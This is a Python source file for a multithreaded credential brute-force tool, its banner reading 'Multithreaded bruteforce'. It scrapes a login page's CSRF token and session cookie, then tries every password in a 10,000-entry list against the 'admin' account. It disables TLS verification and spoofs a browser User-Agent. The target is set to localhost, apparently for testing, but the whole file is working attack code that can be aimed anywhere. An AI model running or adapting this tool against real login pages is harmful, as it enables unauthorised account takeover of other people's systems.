#!/usr/bin/python3
# -*- coding: utf-8 -*-

# To disable warnings in requests' vendored urllib3, import that specific instance of the module:
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
from modules.requests import Session, exceptions
from modules.bs4 import BeautifulSoup
from collections import deque
from threading import Thread
from utils import utils as u
import time
import sys
import re
import os


PASSWORDS = os.path.join(os.path.dirname(__file__), 'utils/passwords10k.txt')
TARGET = 'https://localhost:8443/login'
SUCCESS = 'https://localhost:8443/'
SESSION_COOKIE = 'JSESSIONID'
CSRF_TOKEN = '_csrf'
USERNAME_FORM = 'username-form'
PASSWORD_FORM = 'password-form'
t0 = 0


def main():

    print_banner()
    # Ignore unverified HTTPS request warnings:
    disable_warnings(InsecureRequestWarning)
    global t0
    t0 = time.time()
    num_of_threads = 4
    find_credentials(num_of_threads)


def find_credentials(num_of_threads):
    # Populate queue with passwords
    queue = build_queue()
    # Spawn a pool of threads
    run_threads(num_of_threads, queue)


def build_queue():
    username = 'admin'
    passwords = read_passwords()
    queue = deque()

    for password in passwords:
        queue.append({USERNAME_FORM: username,
                      PASSWORD_FORM: password})

    return queue


def run_threads(num_of_threads, queue):
    num_of_passwords = len(queue)
    attempts = None
    threads = []

    for i in range(num_of_threads):
        session = build_session()
        thread = Bruteforce(session, queue)
        threads.append(thread)

    print_info(num_of_passwords, num_of_threads)

    try:
        while any(thread.is_alive() for thread in threads):
            time.sleep(5)
            attempts = num_of_passwords - len(queue)
            print_progress(attempts, num_of_passwords)

            if attempts == num_of_passwords:
                for thread in threads:
                    thread.join()

    except KeyboardInterrupt:
        if attempts is None:
            print_failure(num_of_passwords - len(queue))
        else:
            print_failure(attempts)


class Bruteforce(Thread):
    def __init__(self, session, queue):
        Thread.__init__(self)
        self.session = session
        self.queue = queue
        self.num_of_passwords = len(queue)
        self.daemon = True
        self.start()

    def run(self):
        while True:
            try:
                data = self.queue.popleft()
                attempt = request("POST", self.session, data)

                if attempt.headers['Location'] == SUCCESS:
                    print_success(
                        self.num_of_passwords - len(self.queue),
                        data[USERNAME_FORM],
                        data[PASSWORD_FORM])

                    os._exit(0)

            except IndexError:
                print(u.error(), 'EMPTY DEQUE')
                return


######################################################################
# HELPER FUNCTIONS
######################################################################
def read_passwords():
    try:
        with open(PASSWORDS, 'r') as passwords:
            return map(str.strip, passwords.readlines())

    except Exception as e:
        print(u.error(), 'COULD NOT READ:', PASSWORDS)
        quit()


def build_session():
    session = Session()
    session_cookie, csrf_token = get_session_tokens(session)

    headers = {'User-Agent':
               'Mozilla/5.0 (BF; Ubuntu; Linux x86_64; rv:76.0) '
               'Gecko/20100101 Firefox/76.0',
               'Accept': '*/*',
               'Connection': 'keep-alive',
               'Accept-Encoding': 'gzip, deflate',
               'Content-Length': '0'}
    session.headers.update(headers)

    cookies = {'name': SESSION_COOKIE,
               'value': session_cookie}
    session.cookies.set(**cookies)
    session.params = {CSRF_TOKEN: csrf_token}

    return session


def get_session_tokens(session, do_print=False):
    success = True
    response = request("GET", session)

    try:
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup('input', {'name': CSRF_TOKEN})[0]['value']

        session_cookie = re \
            .search(SESSION_COOKIE + '=(.*?);', response.headers['set-cookie']) \
            .group(1)

    except Exception as e:
        print(u.warn(), 'NO TOKENS(S) FOUND')
        session_cookie, csrf_token = '', ''
        success = False
        pass

    if success and do_print:
        print_tokens(csrf_token, session_cookie)

    return session_cookie, csrf_token


def request(req, session, payload=None):
    try:
        if 'GET' in req:
            return session.get(
                TARGET,
                verify=False,
                allow_redirects=False)

        elif 'POST' in req:
            return session.post(
                TARGET,
                data=payload,
                verify=False,
                allow_redirects=False)

    except exceptions.HTTPError as eh:
        print(u.error(), 'HTTPError:', eh)
        quit()

    except exceptions.ConnectionError as ec:
        print(u.error(), 'ConnectionError:', ec)
        quit()

    except exceptions.Timeout as et:
        print(u.warn(), 'Timeout:', et)

    except exceptions.RequestException as er:
        print(u.warn(), 'RequestException:', er)


######################################################################
# PRINT
######################################################################
def print_tokens(csrf, session_cookie):
    print(u.info(), 'FOUND TOKENS')
    print(u.info(), CSRF_TOKEN, csrf)
    print(u.info(), SESSION_COOKIE, session_cookie)


def print_info(num_of_passwords, num_of_threads):
    print(u.info(), 'TOT # PASSWORDS:', num_of_passwords)
    print(u.info(), 'TOT # THREADS:', num_of_threads)


def print_success(attempts, username, password):
    print(u.info(), 'FOUND CREDENTIALS')
    print(u.info(), 'USERNAME:', username)
    print(u.info(), 'PASSWORD:', password)
    print_exit(attempts)


def print_failure(attempts):
    print(u.error(), 'FAILED TO FIND CREDENTIALS')
    print_exit(attempts)


def print_progress(attempts, num_of_passwords):
    hours, r = divmod(time.time() - t0, 3600)
    minutes, seconds = divmod(r, 60)
    speed = attempts / float(seconds)
    sys.stdout.write('%s %.2f pw/s (%s/%s) %dh%dm%ds\n' %
                     (u.debug(), speed, attempts, num_of_passwords, hours, minutes, seconds))
    sys.stdout.flush()


def print_exit(attempts):
    t = time.time() - t0
    print_elapsed_time(t)
    print(u.info(), round(attempts / t, 2), 'pw/s')


def print_elapsed_time(t=None):
    t = time.time() - t0 if t is None else t
    hours, rem = divmod(t, 3600)
    minutes, seconds = divmod(rem, 60)
    print('%s TIME: %dh%dm%ds' % (u.info(), hours, minutes, seconds))


def print_banner():
    banner = r'''
  __  __       _ _   _ _   _                        _          _
 |  \/  |_   _| | |_(_) |_| |__  _ __ ___  __ _  __| | ___  __| |
 | |\/| | | | | | __| | __| '_ \| '__/ _ \/ _` |/ _` |/ _ \/ _` |  ____
 | |  | | |_| | | |_| | |_| | | | | |  __/ (_| | (_| |  __/ (_| | |____|
 |_|  |_|\__,_|_|\__|_|\__|_|_|_|_|  \___|\__,_|\__,_|\___|\__,_|
 | |__  _ __ _   _| |_ ___ / _| ___  _ __ ___ ___
 | '_ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \
 | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/
 |_.__/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|

    '''
    print(banner)


if __name__ == '__main__':
    main()
